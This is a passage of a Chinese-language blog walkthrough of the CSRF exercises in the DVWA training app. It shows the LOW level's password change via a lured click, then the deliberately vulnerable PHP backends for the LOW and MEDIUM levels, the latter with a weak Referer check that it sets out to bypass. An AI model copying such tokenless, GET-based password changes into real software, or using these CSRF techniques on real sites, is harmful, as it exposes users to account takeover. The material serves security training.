&#x2F;&gt;&lt;br &#x2F;&gt;且经不住诱惑，点击了网页中的任何区域&lt;br &#x2F;&gt;到这里CSRF攻击就完成了&lt;br &#x2F;&gt;之后我们再登陆DVWA，输入密码lalala，显示登陆失败&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624381949457-5d20916e-3388-4b40-8ac0-88c57d4faa65.png#align=left&amp;amp;display=inline&amp;amp;height=102&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.11.39.png&amp;amp;originHeight=154&amp;amp;originWidth=290&amp;amp;size=5630&amp;amp;status=done&amp;amp;style=none&amp;amp;width=193&quot; alt=&quot;截屏2021-06-23 上午1.11.39.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;只有输入我们自己的密码123456才能登陆成功&lt;&#x2F;p&gt;
&lt;p&gt;后台源码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;&amp;lt;?php 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isset&lt;&#x2F;span&gt;&lt;span&gt;( $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_GET&lt;&#x2F;span&gt;&lt;span&gt;[ &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Change&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; ] ) ) { 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Get input 
&lt;&#x2F;span&gt;&lt;span&gt;    $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new  &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_GET&lt;&#x2F;span&gt;&lt;span&gt;[ &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password_new&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; ]; 
&lt;&#x2F;span&gt;&lt;span&gt;    $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_conf &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_GET&lt;&#x2F;span&gt;&lt;span&gt;[ &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password_conf&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; ]; 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Do the passwords match? 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;( $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;== $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_conf &lt;&#x2F;span&gt;&lt;span&gt;) { 
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; They do! 
&lt;&#x2F;span&gt;&lt;span&gt;        $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;= ((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isset&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;]) &amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;is_object&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;])) ? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_real_escape_string&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;],  $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;) : ((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;trigger_error&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, E_USER_ERROR)) ? &amp;quot;&amp;quot; : &amp;quot;&amp;quot;)); 
&lt;&#x2F;span&gt;&lt;span&gt;        $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;md5&lt;&#x2F;span&gt;&lt;span&gt;( $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;); 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Update the database 
&lt;&#x2F;span&gt;&lt;span&gt;        $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;insert &lt;&#x2F;span&gt;&lt;span&gt;= &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;UPDATE &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;users&lt;&#x2F;span&gt;&lt;span&gt;` &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; password &lt;&#x2F;span&gt;&lt;span&gt;= &amp;#39;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;WHERE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; user &lt;&#x2F;span&gt;&lt;span&gt;= &amp;#39;&amp;quot; . &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dvwaCurrentUser&lt;&#x2F;span&gt;&lt;span&gt;() . &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;; 
&lt;&#x2F;span&gt;&lt;span&gt;        $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;result &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_query&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;],  $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;insert &lt;&#x2F;span&gt;&lt;span&gt;) or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;die&lt;&#x2F;span&gt;&lt;span&gt;( &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;pre&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; . ((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;is_object&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;])) ? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_error&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;]) : (($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;___mysqli_res &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_connect_error&lt;&#x2F;span&gt;&lt;span&gt;()) ? $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;___mysqli_res&lt;&#x2F;span&gt;&lt;span&gt; : &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt;)) . &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;pre&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Feedback for the user 
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;pre&amp;gt;Password Changed.&amp;lt;&#x2F;pre&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;; 
&lt;&#x2F;span&gt;&lt;span&gt;    } 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{ 
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Issue with passwords matching 
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;pre&amp;gt;Passwords did not match.&amp;lt;&#x2F;pre&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;; 
&lt;&#x2F;span&gt;&lt;span&gt;    } 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    ((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;is_null&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;___mysqli_res &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_close&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;]))) ? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt; : $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;___mysqli_res&lt;&#x2F;span&gt;&lt;span&gt;); 
&lt;&#x2F;span&gt;&lt;span&gt;} 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;?&amp;gt; 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;medium-refererjian-ce-rao-guo&quot;&gt;MEDIUM（referer检测绕过）&lt;&#x2F;h2&gt;
&lt;p&gt;这里再用LOW中的方法便会失败&lt;br &#x2F;&gt;burp抓包&lt;br &#x2F;&gt;当我们正常发包时，可以发现密码被成功改变&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624382862089-da1626d7-e058-4126-b6ac-1e8d6f76f193.png#align=left&amp;amp;display=inline&amp;amp;height=1762&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.27.26.png&amp;amp;originHeight=1762&amp;amp;originWidth=2696&amp;amp;size=750354&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-23 上午1.27.26.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;而我们更改一下发送包中的Referer，便会发现密码更改失败&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624382796236-c94c8b22-64ce-41fc-aa8f-2812193a4c9d.png#align=left&amp;amp;display=inline&amp;amp;height=1762&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-23%20%E4%B8%8A%E5%8D%881.26.18.png&amp;amp;originHeight=1762&amp;amp;originWidth=2696&amp;amp;size=751608&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-23 上午1.26.18.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;由此发现服务器端用了referer校验&lt;&#x2F;p&gt;
&lt;p&gt;这里查看一下后台代码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isset&lt;&#x2F;span&gt;&lt;span&gt;( $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_GET&lt;&#x2F;span&gt;&lt;span&gt;[ &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Change&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; ] ) ) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Checks to see where the request came from
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;stripos&lt;&#x2F;span&gt;&lt;span&gt;( $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_SERVER&lt;&#x2F;span&gt;&lt;span&gt;[ &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;HTTP_REFERER&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; ] ,$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_SERVER&lt;&#x2F;span&gt;&lt;span&gt;[ &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;SERVER_NAME&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; ]) !== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false &lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Get input
&lt;&#x2F;span&gt;&lt;span&gt;        $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new  &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_GET&lt;&#x2F;span&gt;&lt;span&gt;[ &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password_new&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; ];
&lt;&#x2F;span&gt;&lt;span&gt;        $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_conf &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_GET&lt;&#x2F;span&gt;&lt;span&gt;[ &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password_conf&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; ];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Do the passwords match?
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;( $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;== $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_conf &lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; They do!
&lt;&#x2F;span&gt;&lt;span&gt;            $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;= ((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isset&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;]) &amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;is_object&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;])) ? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_real_escape_string&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;],  $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;) : ((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;trigger_error&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, E_USER_ERROR)) ? &amp;quot;&amp;quot; : &amp;quot;&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;            $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;md5&lt;&#x2F;span&gt;&lt;span&gt;( $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new &lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Update the database
&lt;&#x2F;span&gt;&lt;span&gt;            $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;insert &lt;&#x2F;span&gt;&lt;span&gt;= &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;UPDATE &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;users&lt;&#x2F;span&gt;&lt;span&gt;` &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; password &lt;&#x2F;span&gt;&lt;span&gt;= &amp;#39;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pass_new&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;WHERE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; user &lt;&#x2F;span&gt;&lt;span&gt;= &amp;#39;&amp;quot; . &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dvwaCurrentUser&lt;&#x2F;span&gt;&lt;span&gt;() . &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;            $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;result &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_query&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;],  $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;insert &lt;&#x2F;span&gt;&lt;span&gt;) or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;die&lt;&#x2F;span&gt;&lt;span&gt;( &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;pre&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; . ((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;is_object&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;])) ? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_error&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GLOBALS&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;___mysqli_ston&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;]) : (($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;___mysqli_res &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;mysqli_connect_error&lt;&#x2F;span&gt;&lt;span&gt;()) ? $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;___mysqli_res&lt;&#x2F;span&gt;&lt;span&gt; : &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt;)) . &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;pre&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Feedback for the user
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;pre&amp;gt;Password Changed.&amp;lt;&#x2F;pre&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Issue with passwords matching
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;pre&amp;gt;Passwords did not match.&amp;lt;&#x2F;pre&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
